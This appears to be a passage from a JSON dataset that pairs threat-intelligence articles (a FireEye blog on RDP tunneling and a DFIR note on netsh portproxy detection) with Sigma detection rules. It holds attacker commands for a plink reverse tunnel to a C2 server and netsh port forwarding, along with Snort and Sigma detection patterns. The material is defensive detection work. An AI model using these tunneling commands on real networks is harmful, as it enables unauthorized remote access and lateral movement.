        "condition": "all of selection_* and not 1 of filter_main_* and not 1 of filter_optional_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_mofcomp_execution.yml",
    "id": "257"
  },
  {
    "url": "https://cloud.google.com/blog/topics/threat-intelligence/bypassing-network-restrictions-through-rdp-tunneling/",
    "markdown": "# Bypassing Network Restrictions Through RDP Tunneling\n\n**January 24, 2019**\n\n---\n\nRemote Desktop Services is a component of Microsoft Windows that is used by various companies for the convenience it offers systems administrators, engineers, and remote employees. On the other hand, Remote Desktop Services, and specifically the Remote Desktop Protocol (RDP), offers this same convenience to remote threat actors during targeted system compromises. When sophisticated threat actors establish a foothold and acquire ample logon credentials, they may switch from backdoors to using direct RDP sessions for remote access. When malware is removed from the equation, intrusions become increasingly difficult to detect.\n\n## RDPing Against the Rules\n\nThreat actors continue to prefer RDP for the stability and functionality advantages over non-graphical backdoors, which can leave unwanted artifacts on a system. As a result, FireEye has observed threat actors using native Windows RDP utilities to connect laterally across systems in compromised environments. Historically, non-exposed systems protected by a firewall and NAT rules were generally considered not to be vulnerable to inbound RDP attempts; however, threat actors have increasingly started to subvert these enterprise controls with the use of network tunneling and host-based port forwarding.\n\nNetwork tunneling and port forwarding take advantage of firewall \"pinholes\" (ports not protected by the firewall that allow an application access to a service on a host in the network protected by the firewall) to establish a connection with a remote server blocked by a firewall. Once a connection has been established to the remote server through the firewall, the connection can be used as a transport mechanism to send or \"tunnel\" local listening services (located inside the firewall) through the firewall, making them accessible to the remote server (located outside the firewall), as shown in Figure 1.\n\n```image\nAlt: Enterprise firewall bypass using RDP and network tunneling with SSH as an example\nDescription: The image illustrates a network configuration demonstrating how RDP tunneling can bypass an enterprise firewall. On the left, a Linux command and control (C2) server is shown with the IP address 192.168.60.135 and SSH service listening on TCP port 22. In the center, there is a representation of an enterprise firewall that blocks inbound connections but allows outbound connections. On the right, an enterprise network is depicted with a victim system running Windows 7, which has inbound RDP connections allowed. The green arrow indicates outbound traffic from the victim system, while the red cross signifies blocked inbound traffic from the C2 server.\nTranscription: |\n  +---------------------+-------------------------+\n  | Linux C2 Server     | 192.168.60.135          |\n  |                     | SSHd listening on TCP22 |\n  +---------------------+-------------------------+\n  | Enterprise firewall | Blocks inbound          |\n  |                     | Allows Outbound         |\n  +---------------------+-------------------------+\n  | Enterprise network  | Victim System           |\n  |                     | Windows 7               |\n  |                     | Inbound RDP allowed     |\n  +---------------------+-------------------------+\n```\n\n*Figure 1: Enterprise firewall bypass using RDP and network tunneling with SSH as an example*\n\n## Inbound RDP Tunneling\n\nA common utility used to tunnel RDP sessions is PuTTY Link, commonly known as Plink. Plink can be used to establish secure shell (SSH) network connections to other systems using arbitrary source and destination ports. Since many IT environments either do not perform protocol inspection or do not block SSH communications outbound from their network, attackers such as FIN8 have used Plink to create encrypted tunnels that allow RDP ports on infected systems to communicate back to the attacker command and control (C2) server.\n\n```\nExample Plink Executable Command:\n\nplink.exe <users>@<IP or domain> -pw <password> -P 22 -2 -4 -T -N -C -R 12345:127.0.0.1:3389\n```\n\nFigure 2 provides an example of a successful RDP tunnel created using Plink, and Figure 3 provides an example of communications being sent through the tunnel using port forwarding from the attacker C2 server.\n\n```image\nAlt: Example of successful RDP tunnel created using Plink\nDescription: The image depicts a network diagram illustrating the process of RDP tunneling using Plink. It shows a Linux C2 (command and control) server that receives a connection on TCP port 22. The diagram highlights that the enterprise firewall blocks inbound connections but allows outbound ones. An arrow indicates the establishment of a tunnel to a victim system, where the Plink executable is executed to open the tunnel, utilizing an ephemeral TCP port for the connection. The diagram visually represents the flow of communication between the systems involved.\nTranscription: |\n  +------------------------------+---------------------+-----------------------------------+\n  | Linux C2 Server              | Enterprise firewall | Victim System                     |\n  | Received connection on TCP22 | Blocks inbound      | plink.exe executed to open tunnel |\n  +------------------------------+---------------------+-----------------------------------+\n  |                              | Allows Outbound     |                                   |\n  +------------------------------+---------------------+-----------------------------------+\n  |                              |                     | Ephemeral TCP port                |\n  +------------------------------+---------------------+-----------------------------------+\n```\n\n*Figure 2: Example of successful RDP tunnel created using Plink*\n\n```image\nAlt: Example of successful port forwarding from the attacker C2 server to the victim\nDescription: The image illustrates the process of RDP tunneling, specifically showing the communication flow between a Linux Command and Control (C2) server and a victim system. It depicts how RDP connections are forwarded through a secure tunnel established on TCP port 22, while the enterprise firewall blocks inbound traffic but allows outbound connections. The victim system is shown to be listening for RDP on TCP port 3389, with the text indicating the specific TCP ports involved in the tunneling process.\nTranscription: |\n  +---------------------+--------------------------------+\n  | Linux C2 Server     | RDP connect to 127.0.0.1:12345 |\n  |                     |                                |\n  |                     | TCP 12345 forwards to TCP 22   |\n  +---------------------+--------------------------------+\n  | Enterprise firewall | Blocks inbound                 |\n  |                     | Allows Outbound                |\n  +---------------------+--------------------------------+\n  |                     | RDP travels through tunnel     |\n  |                     |                                |\n  | Victim System       | Listening for RDP on TCP 3389  |\n  |                     |                                |\n  |                     | Ephemeral TCP port             |\n  +---------------------+--------------------------------+\n```\n\n*Figure 3: Example of successful port forwarding from the attacker C2 server to the victim*\n\nIt should be noted that for an attacker to be able to RDP to a system, they must already have access to the system through other means of compromise in order to create or access the necessary tunneling utility. For example, an attacker’s initial system compromise could have been the result of a payload dropped from a phishing email aimed at establishing a foothold into the environment, while simultaneously extracting credentials to escalate privileges. RDP tunneling into a compromised environment is one of many access methods typically used by attackers to maintain their presence in an environment.\n\n## Jump Box Pivoting\n\nNot only is RDP the perfect tool for accessing compromised systems externally, RDP sessions can be daisy chained across multiple systems as a way to move laterally through an environment. FireEye has observed threat actors using the native Windows Network Shell (netsh) command to utilize RDP port forwarding as a way to access newly discovered segmented networks reachable only through an administrative jump box.\n\n```\nExample netsh Port Forwarding Command:\nnetsh interface portproxy add v4tov4 listenport=8001 listenaddress=<JUMP BOX IP> connectport=3389 connectaddress=<DESTINATION IP>\n\nExample Shortened netsh Port Forwarding Command:\nnetsh I p a v l=8001 listena=<JUMP BOX IP> connectp=3389 c=<DESTINATION IP>\n```\n\nFor example, a threat actor could configure the jump box to listen on an arbitrary port for traffic being sent from a previously compromised system. The traffic would then be forwarded directly through the jump box to any system on the segmented network using any designated port, including the default RDP port TCP 3389. This type of RDP port forwarding gives threat actors a way to utilize a jump box’s allowed network routes without disrupting legitimate administrators who are using the jump box during an ongoing RDP session. Figure 4 provides an example of RDP lateral movement to a segmented network via an administrative jump box.\n\n```image\nAlt: Lateral Movement via RDP using a jump box to a segmented network\nDescription: The image illustrates a network diagram depicting the process of lateral movement via Remote Desktop Protocol (RDP) using a jump box to access a segmented network. It shows a threat actor originating from the Internet, targeting a victim system that is part of a Local Area Network (LAN) connected to a jump box. The jump box is also shown connecting to a segmented network through a firewall. RDP connections are indicated between the threat actor, the jump box, the victim system, and the segmented network, highlighting how RDP can be utilized for lateral movement in a compromised environment.\nTranscription: |\n  +---------------------+\n  |   Segmented Network  |\n  +---------------------+\n            ^\n            |\n           RDP\n            |\n  +---------------------+\n  |      Firewall       |\n  +---------------------+\n            ^\n            |\n           RDP\n            |\n  +---------------------+\n  |        LAN          |\n  +---------------------+\n            ^\n            |\n           RDP\n            |\n  +---------------------+\n  |      Jump Box       |\n  +---------------------+\n            ^\n            |\n           RDP\n            |\n  +---------------------+\n  |    Victim System    |\n  +---------------------+\n            ^\n            |\n           RDP\n            |\n  +---------------------+\n  |    Threat Actor     |\n  +---------------------+\n            |\n         Internet\n```\n\n*Figure 4: Lateral Movement via RDP using a jump box to a segmented network*\n\n## Prevention and Detection of RDP Tunneling\n\nIf RDP is enabled, threat actors have a way to move laterally and maintain presence in the environment through tunneling or port forwarding. To mitigate vulnerability to and detect these types of RDP attacks, organizations should focus on both host-based and network-based prevention and detection mechanisms. For additional information see the FireEye blog post on establishing a baseline for remote desktop protocol.\n\n### Host-Based Prevention:\n\n- **Remote Desktop Service**: Disable the remote desktop service on all end-user workstations and systems for which the service is not required for remote connectivity.\n- **Host-based Firewalls**: Enable host-based firewall rules that explicitly deny inbound RDP connections.\n- **Local Accounts**: Prevent the use of RDP using local accounts on workstations by enabling the “Deny log on through Remote Desktop Services” security setting.\n\n### Host-Based Detection:\n\n- **Registry Keys**: Review registry keys associated with Plink connections that can be abused by RDP session tunneling to identify unique source and destination systems. By default, both PuTTY and Plink store session information and previously connected ssh servers in the following registry keys on Windows systems:\n  - `HKEY_CURRENT_USER\\Software\\SimonTatham\\PuTTY`\n  - `HKEY_CURRENT_USER\\SoftWare\\SimonTatham\\PuTTY\\SshHostKeys`\n\n  Similarly, the creation of a PortProxy configuration with netsh is stored with the following Windows registry key:\n  - `HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\PortProxy\\v4tov4`\n\n- **Event Logs**: Review event logs for high-fidelity logon events. Common RDP logon events are contained in the following event logs on Windows systems:\n  - `%systemroot%\\Windows\\System32\\winevt\\Logs\\Microsoft-TerminalServices-LocalSessionmanager%3Operational.evtx`\n  - `%systemroot%\\Windows\\System32\\winevt\\Logs\\Security.evtx`\n\n  The “TerminalServices-LocalSessionManager” log contains successful interactive local or remote logon events as identified by EID 21 and successful reconnection of a previously established RDP session not terminated by a proper user logout as identified by EID 25. The “Security” log contains successful Type 10 remote interactive logons (RDP) as identified by EID 4624. A source IP address recorded as a localhost IP address (127.0.0.1 – 127.255.255.255) may be indicative of a tunneled logon routed from a listening localhost port to the localhost’s RDP port TCP 3389.\n\n- Review your artifacts of execution for “plink.exe” file execution. Note that attackers can rename the file name to avoid detection. Relevant artifacts include, but are not limited to:\n  - Application Compatibility Cache/Shimcache\n  - Amcache\n  - Jump Lists\n  - Prefetch\n  - Service Events\n  - CCM Recently Used Apps from the WMI repository\n  - Registry keys\n\n### Network-Based Prevention:\n\n- **Remote Connectivity**: Where RDP is required for connectivity, enforce the connection to be initiated from a designated jump box or centralized management server.\n- **Domain Accounts**: Employ the “Deny log on through Remote Desktop Services” security setting for privileged accounts (e.g. domain administrators) and service accounts, as these types of accounts are commonly used by threat actors to laterally move to sensitive systems in an environment.\n\n### Network-Based Detection:\n\n- **Firewall Rules**: Review existing firewall rules to identify areas of vulnerability to port forwarding. In addition to the potential use of port forwarding, monitoring for internal communications between workstations in the environment should be conducted. Generally, workstations do not have a need to communicate with one another directly and Firewall rules can be used to prevent any such communication, except where needed.\n- **Network Traffic**: Perform content inspection of network traffic. Not all traffic communicating on a given port is what it appears to be. For example, threat actors may use TCP ports 80 or 443 to establish an RDP tunnel with a remote server. Deep inspection of the network traffic can likely reveal that it is not actually HTTP or HTTPS, but entirely different traffic all together. Therefore, organizations should closely monitor their network traffic.\n- **Snort Rules**: The main indicator of tunneled RDP occurs when the RDP handshake has a designated low source port generally used for another protocol. Figure 5 provides two sample Snort rules that can help security teams identify RDP tunneling in their network traffic by identifying designated low source ports generally used for other protocols.\n\n```\nalert tcp any [21,22,23,25,53,80,443,8080] -> any !3389 (msg:\"RDP - HANDSHAKE [Tunneled msts]\"; dsize:<65; content:\"|03 00 00|\"; depth:3; content:\"|e0|\"; distance:2; within:1; content:\"Cookie: mstshash=\"; distance:5; within:17; sid:1; rev:1;)\n```\n\n```\nalert tcp any [21,22,23,25,53,80,443,8080] -> any !3389 (msg:\"RDP - HANDSHAKE [Tunneled]\"; flow:established; content:\"|c0 00|Duca\"; depth:250; content:\"rdpdr\"; content:\"cliprdr\"; sid:2; rev:1;)\n```\n\n*Figure 5: Sample Snort Rules to identify RDP tunneling*\n\n## Conclusion\n\nRDP enables IT environments to offer freedom and interoperability to users. But with more and more threat actors using RDP to move laterally across networks with limited segmentation, security teams are being challenged to decipher between legitimate and malicious RDP traffic. Therefore, adequate host-based and network-based prevention and detection methods should be taken to actively monitor for and be able to identify malicious RDP usage.",
    "sigma_rule": {
      "title": "New Port Forwarding Rule Added Via Netsh.EXE",
      "id": "322ed9ec-fcab-4f67-9a34-e7c6aef43614",
      "status": "test",
      "description": "Detects the execution of netsh commands that configure a new port forwarding (PortProxy) rule",
      "references": [
        "https://cloud.google.com/blog/topics/threat-intelligence/bypassing-network-restrictions-through-rdp-tunneling/",
        "https://adepts.of0x.cc/netsh-portproxy-code/",
        "https://www.dfirnotes.net/portproxy_detection/"
      ],
      "author": "Florian Roth (Nextron Systems), omkar72, oscd.community, Swachchhanda Shrawan Poudel",
      "date": "2019-01-29",
      "modified": "2023-09-01",
      "tags": [
        "attack.lateral-movement",
        "attack.defense-evasion",
        "attack.command-and-control",
        "attack.t1090"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\netsh.exe"
          },
          {
            "OriginalFileName": "netsh.exe"
          }
        ],
        "selection_cli_1": {
          "CommandLine|contains|all": [
            "interface",
            "portproxy",
            "add",
            "v4tov4"
          ]
        },
        "selection_cli_2": {
          "CommandLine|contains|all": [
            "i ",
            "p ",
            "a ",
            "v "
          ]
        },
        "selection_cli_3": {
          "CommandLine|contains|all": [
            "connectp",
            "listena",
            "c="
          ]
        },
        "condition": "selection_img and 1 of selection_cli_*"
      },
      "falsepositives": [
        "Legitimate administration activity",
        "WSL2 network bridge PowerShell script used for WSL/Kubernetes/Docker (e.g. https://github.com/microsoft/WSL/issues/4150#issuecomment-504209723)"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_netsh_port_forwarding.yml",
    "id": "279"
  },
  {
    "url": "https://www.dfirnotes.net/portproxy_detection/",
    "markdown": "# Port Proxy detection\n\n## How can we see port proxy configurations in DFIR?\n\nI came across a new (to me) technique for evasion and persistence reading news today. The report(1) specifically called out the clever use of built in Windows service control and network utilities (sc, netsh) by some attackers they’d investigated. After Googling for a few minutes it was clear that this technique is known to Windows sysadmins and the attacker community (as it is featured in a Metasploit module(2).\n\nSo, let’s run the process: create the behaviour in the lab, look for the artifacts, and then figure out how to capture and analyse them.\n\n## Make some in the lab\n\nI created a portproxy configuration with netsh on archie, Win10 x64 to send traffic out to another host, port. Tested with netcat chat. Also made one in the seven VM, and the dumped memory variously.\n\n```\nnetsh>add v4tov4 listenport=3333 connectaddress=192.168.0.8 connectport=8888 listenaddress=0.0.0.0\n\nPS C:\\malware> netsh interface portproxy show all\n\nListen on ipv4:             Connect to ipv4:\n\nAddress         Port        Address         Port\n--------------- ----------  --------------- ----------\n0.0.0.0         3333        192.168.0.8     8888\n```\n\nAnd it can be seen in running processes, with `netstat -naobp TCP`:\n\n```\nTCP    192.168.0.15:3333      192.168.0.15:16047     ESTABLISHED     1572   iphlpsvc\n```\n\n## Can we find it with Memory Analysis?\n\nVolatile capture with winpmem2, write raw for volatility’s use.\n\n```\nPS> winpmem-2.1.post4.exe -o archie.aff4\nPS> rekal.exe imagecopy -f .\\archie.aff4 -O archie.raw\n```\n\nAfter imageinfo to get profile(s), some nosing about to find memory that references the port proxy…\n\n- netsh may not have been running at time of w10 mem capture\n- Yarascan for the port number as string:\n  ```\n  rekal.exe -f .\\archie.aff4 yarascan --string '3333'\n  ```\n  - many results that don’t look related, probably too broad a key\n- ibid for the IP address .. left running for a couple hours\n- another try for ‘ProxyPort’ gets at least one hit:\n\n```\narchie> rekal.exe -f .\\archie.aff4 yarascan --string 'PortProxy'\n2017-02-08 18:50:24,236:WARNING:rekall.1:Unable to parse profile section $CONSTANT_TYPES\n2017-02-08 18:50:24,237:WARNING:rekall.1:Unable to parse profile section $CONSTANT_TYPES\nOwner    Rule        Offset                                  HexDump                              Symbol\n----- ---------- -------------- ----------------------------------------------------------------- ------\n-     r1         0x8202038bd448 50 6f 72 74 50 72 6f 78 79 00 00 05 20 00 00 00  PortProxy.......\n                                a8 ff ff ff 6e 6b 20 00 02 d9 44 a6 97 3f d2 01  ....nk....D..?..\n                                03 00 00 00 28 b1 4d 00 01 00 00 00 00 00 00 00  ....(.M.........\n                                10 4b 5e 00 ff ff ff ff 0b 00 00 00 28 45 5e 00  .K^.........(E^.                              \n```\n\n## How about dynamic analysis?\n\nOf course we know we can see them in netsh as above. Win10 netsh depreciation notice refers us to Powershell. Some trial and error with those modules did not uncover the portproxy settings.\n\n```\nIn future versions of Windows, Microsoft might remove the Netsh functionality\nfor TCP/IP.\n\nMicrosoft recommends that you transition to Windows PowerShell if you currently\nuse netsh to configure and manage TCP/IP.\n\nType Get-Command -Module NetTCPIP at the Windows PowerShell prompt to view\na list of commands to manage TCP/IP.\n\nVisit http://go.microsoft.com/fwlink/?LinkId=217627 for additional information\nabout PowerShell commands for TCP/IP.\n```\n\nGuessing the storage is Registry, trying RegShot in the live VM shows it clearly:\n\n```\nHKLM\\SYSTEM\\ControlSet001\\services\\PortProxy\\v4tov4\\tcp\\0.0.0.0/4444: \"192.168.0.15/8080\"\nHKLM\\SYSTEM\\CurrentControlSet\\services\\PortProxy\\v4tov4\\tcp\\0.0.0.0/4444: \"192.168.0.15/8080\"\n```\n\nAnd now we can look with EG printkey on the memory dump(s)…\n\nIt’s included in output of\n\n```\nPS> rekal.exe -f .\\archie.aff4 printkey -r -k \"\\ControlSet001\\Services\" > archie-rekall-services.txt\n```\n\nbut it’s just a tease:\n\n```\nRegistry: Unnamed @ 0x82020323e000\nKey name: PortProxy (S) @ 0x8202038bd3fc\nLast updated: 2017-02-08 15:14:52Z\n\nSubkeys:\n\nValues:\n```\n\nand I’m having trouble pinning it down or getting the full details out with Rekall or Vol26. Printkey is always so fiesty…\n\n```\nPS C:\\malware> C:\\tools\\volatility_2.6_win64_standalone\\volatility_2.6_win64_standalone.exe -f .\\seven-memdump.mem --profile Win7SP1x86_23418 printkey -K \"services\"\nVolatility Foundation Volatility Framework 2.6\nLegend: (S) = Stable   (V) = Volatile\n\nThe requested key could not be found in the hive(s) searched\nPS C:\\malware> C:\\tools\\volatility_2.6_win64_standalone\\volatility_2.6_win64_standalone.exe -f .\\seven-memdump.mem --profile Win7SP1x86_23418 printkey -K \"ControlSet001\"\nVolatility Foundation Volatility Framework 2.6\nLegend: (S) = Stable   (V) = Volatile\n\n----------------------------\nRegistry: \\REGISTRY\\MACHINE\\SYSTEM\nKey name: ControlSet001 (S)\nLast updated: 2013-10-23 16:16:25 UTC+0000\n\nSubkeys:\n  (S) Control\n  (S) Enum\n  (S) Hardware Profiles\n  (S) Policies\n  (S) services\n\nValues:\nPS C:\\malware> C:\\tools\\volatility_2.6_win64_standalone\\volatility_2.6_win64_standalone.exe -f .\\seven-memdump.mem --profile Win7SP1x86_23418 printkey -K \"ControlSet001\"\n```\n\nAnd despite being in the services folder in the registry keys, it doesn’t show in svcscan -V output as ProxyPort, but instead as “IP Helper” in the NetSvcs.\n\n```\nOffset: 0x7bb828\nOrder: 127\nStart: SERVICE_AUTO_START\nProcess ID: 876\nService Name: iphlpsvc\nDisplay Name: IP Helper\nService Type: SERVICE_WIN32_SHARE_PROCESS\nService State: SERVICE_RUNNING\nBinary Path: C:\\Windows\\system32\\svchost.exe -k netsvcs\nServiceDll: %SystemRoot%\\System32\\iphlpsvc.dll\nImagePath: %SystemRoot%\\System32\\svchost.exe -k NetSvcs\nFailureCommand:\n```\n\nThese are certainly detectable, and can be collected in triage capture as well as in intensive analysis. It’s persistent into Registry but otherwise a little tricky to see outside of the *netsh* environment.\n\n## Refs\n\n1. sc and netsh from: https://securelist.com/blog/research/77403/fileless-attacks-against-enterprise-networks/\n2. MSF module: https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/manage/portproxy.rb\n\nWritten on February 8, 2017",
    "sigma_rule": {
      "title": "New Port Forwarding Rule Added Via Netsh.EXE",
      "id": "322ed9ec-fcab-4f67-9a34-e7c6aef43614",
      "status": "test",
      "description": "Detects the execution of netsh commands that configure a new port forwarding (PortProxy) rule",
      "references": [
        "https://cloud.google.com/blog/topics/threat-intelligence/bypassing-network-restrictions-through-rdp-tunneling/",
        "https://adepts.of0x.cc/netsh-portproxy-code/",
        "https://www.dfirnotes.net/portproxy_detection/"
      ],
      "author": "Florian Roth (Nextron Systems), omkar72, oscd.community, Swachchhanda Shrawan Poudel",
      "date": "2019-01-29",
      "modified": "2023-09-01",
      "tags": [
        "attack.lateral-movement",
        "attack.defense-evasion",
        "attack.command-and-control",
        "attack.t1090"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\netsh.exe"
          },
          {
            "OriginalFileName": "netsh.exe"
          }
        ],
        "selection_cli_1": {
          "CommandLine|contains|all": [
            "interface",
            "portproxy",
            "add",
            "v4tov4"
          ]
        },
        "selection_cli_2": {
          "CommandLine|contains|all": [
            "i ",
            "p ",
            "a ",
            "v "
          ]
        },
        "selection_cli_3": {
          "CommandLine|contains|all": [
            "connectp",
            "listena",
            "c="
          ]
        },
        "condition": "selection_img and 1 of selection_cli_*"
      },
      "falsepositives": [
        "Legitimate administration activity",
        "WSL2 network bridge PowerShell script used for WSL/Kubernetes/Docker (e.g. https://github.com/microsoft/WSL/issues/4150#issuecomment-504209723)"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_netsh_port_forwarding.yml",
    "id": "281"
  },
  {
    "url": "https://cloud.google.com/blog/topics/threat-intelligence/bypassing-network-restrictions-through-rdp-tunneling/",
    "markdown": "# Bypassing Network Restrictions Through RDP Tunneling\n\n**January 24, 2019**\n\n---\n\nRemote Desktop Services is a component of Microsoft Windows that is used by various companies for the convenience it offers systems administrators, engineers, and remote employees. On the other hand, Remote Desktop Services, and specifically the Remote Desktop Protocol (RDP), offers this same convenience to remote threat actors during targeted system compromises. When sophisticated threat actors establish a foothold and acquire ample logon credentials, they may switch from backdoors to using direct RDP sessions for remote access. When malware is removed from the equation, intrusions become increasingly difficult to detect.\n\n## RDPing Against the Rules\n\nThreat actors continue to prefer RDP for the stability and functionality advantages over non-graphical backdoors, which can leave unwanted artifacts on a system. As a result, FireEye has observed threat actors using native Windows RDP utilities to connect laterally across systems in compromised environments. Historically, non-exposed systems protected by a firewall and NAT rules were generally considered not to be vulnerable to inbound RDP attempts; however, threat actors have increasingly started to subvert these enterprise controls with the use of network tunneling and host-based port forwarding.\n\nNetwork tunneling and port forwarding take advantage of firewall \"pinholes\" (ports not protected by the firewall that allow an application access to a service on a host in the network protected by the firewall) to establish a connection with a remote server blocked by a firewall. Once a connection has been established to the remote server through the firewall, the connection can be used as a transport mechanism to send or \"tunnel\" local listening services (located inside the firewall) through the firewall, making them accessible to the remote server (located outside the firewall), as shown in Figure 1.\n\n```image\nAlt: Enterprise firewall bypass using RDP and network tunneling with SSH as an example\nDescription: The image illustrates a network configuration demonstrating how RDP tunneling can bypass an enterprise firewall. On the left, a Linux command and control (C2) server is shown with the IP address 192.168.60.135 and SSH service listening on TCP port 22. In the center, there is a representation of an enterprise firewall that blocks inbound connections but allows outbound connections. On the right, an enterprise network is depicted with a victim system running Windows 7, which has inbound RDP connections allowed. The green arrow indicates outbound traffic from the victim system, while the red cross signifies blocked inbound traffic from the C2 server.\nTranscription: |\n  +---------------------+-------------------------+\n  | Linux C2 Server     | 192.168.60.135          |\n  |                     | SSHd listening on TCP22 |\n  +---------------------+-------------------------+\n  | Enterprise firewall | Blocks inbound          |\n  |                     | Allows Outbound         |\n  +---------------------+-------------------------+\n  | Enterprise network  | Victim System           |\n  |                     | Windows 7               |\n  |                     | Inbound RDP allowed     |\n  +---------------------+-------------------------+\n```\n\n*Figure 1: Enterprise firewall bypass using RDP and network tunneling with SSH as an example*\n\n## Inbound RDP Tunneling\n\nA common utility used to tunnel RDP sessions is PuTTY Link, commonly known as Plink. Plink can be used to establish secure shell (SSH) network connections to other systems using arbitrary source and destination ports. Since many IT environments either do not perform protocol inspection or do not block SSH communications outbound from their network, attackers such as FIN8 have used Plink to create encrypted tunnels that allow RDP ports on infected systems to communicate back to the attacker command and control (C2) server.\n\n```\nExample Plink Executable Command:\n\nplink.exe <users>@<IP or domain> -pw <password> -P 22 -2 -4 -T -N -C -R 12345:127.0.0.1:3389\n```\n\nFigure 2 provides an example of a successful RDP tunnel created using Plink, and Figure 3 provides an example of communications being sent through the tunnel using port forwarding from the attacker C2 server.\n\n```image\nAlt: Example of successful RDP tunnel created using Plink\nDescription: The image depicts a network diagram illustrating the process of RDP tunneling using Plink. It shows a Linux C2 (command and control) server that receives a connection on TCP port 22. The diagram highlights that the enterprise firewall blocks inbound connections but allows outbound ones. An arrow indicates the establishment of a tunnel to a victim system, where the Plink executable is executed to open the tunnel, utilizing an ephemeral TCP port for the connection. The diagram visually represents the flow of communication between the systems involved.\nTranscription: |\n  +------------------------------+---------------------+-----------------------------------+\n  | Linux C2 Server              | Enterprise firewall | Victim System                     |\n  | Received connection on TCP22 | Blocks inbound      | plink.exe executed to open tunnel |\n  +------------------------------+---------------------+-----------------------------------+\n  |                              | Allows Outbound     |                                   |\n  +------------------------------+---------------------+-----------------------------------+\n  |                              |                     | Ephemeral TCP port                |\n  +------------------------------+---------------------+-----------------------------------+\n```\n\n*Figure 2: Example of successful RDP tunnel created using Plink*\n\n```image\nAlt: Example of successful port forwarding from the attacker C2 server to the victim\nDescription: The image illustrates the process of RDP tunneling, specifically showing the communication flow between a Linux Command and Control (C2) server and a victim system. It depicts how RDP connections are forwarded through a secure tunnel established on TCP port 22, while the enterprise firewall blocks inbound traffic but allows outbound connections. The victim system is shown to be listening for RDP on TCP port 3389, with the text indicating the specific TCP ports involved in the tunneling process.\nTranscription: |\n  +---------------------+--------------------------------+\n  | Linux C2 Server     | RDP connect to 127.0.0.1:12345 |\n  |                     |                                |\n  |                     | TCP 12345 forwards to TCP 22   |\n  +---------------------+--------------------------------+\n  | Enterprise firewall | Blocks inbound                 |\n  |                     | Allows Outbound                |\n  +---------------------+--------------------------------+\n  |                     | RDP travels through tunnel     |\n  |                     |                                |\n  | Victim System       | Listening for RDP on TCP 3389  |\n  |                     |                                |\n  |                     | Ephemeral TCP port             |\n  +---------------------+--------------------------------+\n```\n\n*Figure 3: Example of successful port forwarding from the attacker C2 server to the victim*\n\nIt should be noted that for an attacker to be able to RDP to a system, they must already have access to the system through other means of compromise in order to create or access the necessary tunneling utility. For example, an attacker’s initial system compromise could have been the result of a payload dropped from a phishing email aimed at establishing a foothold into the environment, while simultaneously extracting credentials to escalate privileges. RDP tunneling into a compromised environment is one of many access methods typically used by attackers to maintain their presence in an environment.\n\n## Jump Box Pivoting\n\nNot only is RDP the perfect tool for accessing compromised systems externally, RDP sessions can be daisy chained across multiple systems as a way to move laterally through an environment. FireEye has observed threat actors using the native Windows Network Shell (netsh) command to utilize RDP port forwarding as a way to access newly discovered segmented networks reachable only through an administrative jump box.\n\n```\nExample netsh Port Forwarding Command:\nnetsh interface portproxy add v4tov4 listenport=8001 listenaddress=<JUMP BOX IP> connectport=3389 connectaddress=<DESTINATION IP>\n\nExample Shortened netsh Port Forwarding Command:\nnetsh I p a v l=8001 listena=<JUMP BOX IP> connectp=3389 c=<DESTINATION IP>\n```\n\nFor example, a threat actor could configure the jump box to listen on an arbitrary port for traffic being sent from a previously compromised system. The traffic would then be forwarded directly through the jump box to any system on the segmented network using any designated port, including the default RDP port TCP 3389. This type of RDP port forwarding gives threat actors a way to utilize a jump box’s allowed network routes without disrupting legitimate administrators who are using the jump box during an ongoing RDP session. Figure 4 provides an example of RDP lateral movement to a segmented network via an administrative jump box.\n\n```image\nAlt: Lateral Movement via RDP using a jump box to a segmented network\nDescription: The image illustrates a network diagram depicting the process of lateral movement via Remote Desktop Protocol (RDP) using a jump box to access a segmented network. It shows a threat actor originating from the Internet, targeting a victim system that is part of a Local Area Network (LAN) connected to a jump box. The jump box is also shown connecting to a segmented network through a firewall. RDP connections are indicated between the threat actor, the jump box, the victim system, and the segmented network, highlighting how RDP can be utilized for lateral movement in a compromised environment.\nTranscription: |\n  +---------------------+\n  |   Segmented Network  |\n  +---------------------+\n            ^\n            |\n           RDP\n            |\n  +---------------------+\n  |      Firewall       |\n  +---------------------+\n            ^\n            |\n           RDP\n            |\n  +---------------------+\n  |        LAN          |\n  +---------------------+\n            ^\n            |\n           RDP\n            |\n  +---------------------+\n  |      Jump Box       |\n  +---------------------+\n            ^\n            |\n           RDP\n            |\n  +---------------------+\n  |    Victim System    |\n  +---------------------+\n            ^\n            |\n           RDP\n            |\n  +---------------------+\n  |    Threat Actor     |\n  +---------------------+\n            |\n         Internet\n```\n\n*Figure 4: Lateral Movement via RDP using a jump box to a segmented network*\n\n## Prevention and Detection of RDP Tunneling\n\nIf RDP is enabled, threat actors have a way to move laterally and maintain presence in the environment through tunneling or port forwarding. To mitigate vulnerability to and detect these types of RDP attacks, organizations should focus on both host-based and network-based prevention and detection mechanisms. For additional information see the FireEye blog post on establishing a baseline for remote desktop protocol.\n\n### Host-Based Prevention:\n\n- **Remote Desktop Service**: Disable the remote desktop service on all end-user workstations and systems for which the service is not required for remote connectivity.\n- **Host-based Firewalls**: Enable host-based firewall rules that explicitly deny inbound RDP connections.\n- **Local Accounts**: Prevent the use of RDP using local accounts on workstations by enabling the “Deny log on through Remote Desktop Services” security setting.\n\n### Host-Based Detection:\n\n- **Registry Keys**: Review registry keys associated with Plink connections that can be abused by RDP session tunneling to identify unique source and destination systems. By default, both PuTTY and Plink store session information and previously connected ssh servers in the following registry keys on Windows systems:\n  - `HKEY_CURRENT_USER\\Software\\SimonTatham\\PuTTY`\n  - `HKEY_CURRENT_USER\\SoftWare\\SimonTatham\\PuTTY\\SshHostKeys`\n\n  Similarly, the creation of a PortProxy configuration with netsh is stored with the following Windows registry key:\n  - 